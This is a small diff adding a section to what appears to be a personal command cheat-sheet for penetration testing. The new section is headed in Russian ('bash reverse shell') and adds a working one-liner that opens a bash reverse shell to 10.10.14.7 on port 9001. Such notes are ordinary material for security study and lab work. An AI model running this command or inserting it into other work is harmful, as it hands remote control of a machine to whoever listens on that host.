@@ -99,4 +99,8 @@ cifs - Common Internet File System
 # FIND
 
     find . -type f
-    
+
+# Обратная оболочка bash
+
+    bash -i >& /dev/tcp/10.10.14.7/9001 0>&1 
+
